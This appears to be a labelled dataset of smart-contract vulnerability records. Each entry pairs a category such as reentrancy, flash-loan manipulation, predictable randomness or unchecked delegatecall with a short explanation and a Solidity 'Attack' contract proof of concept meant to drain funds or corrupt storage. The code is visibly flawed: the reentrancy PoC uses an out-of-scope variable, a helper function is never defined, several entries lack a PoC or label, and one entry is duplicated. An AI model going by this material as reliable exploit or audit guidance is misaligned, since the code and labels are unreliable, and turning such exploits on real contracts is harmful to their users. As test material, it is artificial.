Category: Business Logic Flaws
Explanation: Unbounded debt reduction allows manipulation of loan balances, evading repayment.
PoC: contract Attack { function exploit(address target) public { LogicFlaw(target).repayLoan(type(uint).max); } }
Vulnerable: True

Category: Random Number Manipulation
Explanation: Predictable random number allows manipulation of winner selection.
PoC: contract Attack { function exploit(address target) public { Random(target).pickWinner(); } }
Vulnerable: True

Category: Business Logic Flaws
Explanation: Flawed profit calculation allows excessive withdrawals, draining funds.
PoC: contract Attack { function exploit(address target) public { LogicFlaw(target).withdrawProfit(msg.sender); } }
Vulnerable: True

Category: Flash Loan Attacks
Explanation: Flash loan enables market manipulation, exploiting borrow logic.
PoC: contract Attack { function exploit(address target, uint amount) public { FlashLoan(target).flashBorrow(amount); manipulateMarket(); } }
Vulnerable: True

Category: Flash Loan Attacks
Explanation: Flash loan enables market manipulation, exploiting borrow logic.
PoC: contract Attack { function exploit(address target, uint amount) public { FlashLoan(target).borrowTokens(amount); manipulateMarket(); } }

Category: Unchecked External Calls
Explanation: Unverified delegatecall allows storage corruption via malicious contract.
PoC: contract Attack { function exploit(address target) public { bytes memory malicious = abi.encodeWithSignature('corruptStorage()'); UncheckedCall(target).executeDelegate(address(this), malicious); } function corruptStorage() public { /* corrupt storage */ } }
Vulnerable: True

Category: Random Number Manipulation
Explanation: Predictable seed using timestamp and user input allows manipulation of random outcomes.
PoC: contract Attack { function exploit(address target, uint predictableSeed) public { Random(target).getRandom(predictableSeed); } }
Vulnerable: True

Category: Gas Griefing
Explanation: Unbounded hook execution causes gas exhaustion, disrupting contract functionality.

Vulnerable: True

Category: Logic Errors
Explanation: Flawed profit distribution overpays single recipient, draining funds.

Category: Reentrancy
Explanation: Reentrancy via external call enables recursive fund drainage before balance update.
PoC: contract Attack { address target; function attack(address _target) public { target = _target; bytes memory malicious = abi.encodeWithSignature('reenter()'); Reentrancy(target).withdraw(address(this), malicious); } function reenter() external { if(gasleft() > 25000) Reentrancy(target).withdraw(address(this), malicious); } }
Vulnerable: True
